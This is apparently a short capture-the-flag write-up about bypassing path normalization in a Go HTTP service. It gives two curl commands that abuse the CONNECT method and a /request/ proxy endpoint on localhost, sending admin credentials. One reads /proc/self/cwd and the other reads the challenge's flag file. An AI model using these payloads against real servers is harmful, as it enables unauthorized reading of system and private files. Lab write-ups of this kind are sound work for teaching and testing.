https://github.com/golang/go/blob/9bb97ea047890e900dae04202a231685492c4b18/src/net/http/server.go#L2354-L2364

Abusing http verb connect , we craft payloads like:
which bypasses path normalization:


curl -X CONNECT --path-as-is -H "Authorization: Bearer YWRtaW46YWRtaW4=" "http://localhost:40048/request/http://localhost:40048/link%3Fpath=/proc/self/cwd

to get the folder name and

curl -X CONNECT -H "Authorization: Bearer YWRtaW46YWRtaW4" "http://localhost:40048/request/http://localhost:40048/view/tmp/Zy2l6Qdsfxsb/public/flag.txt"

to get the flag
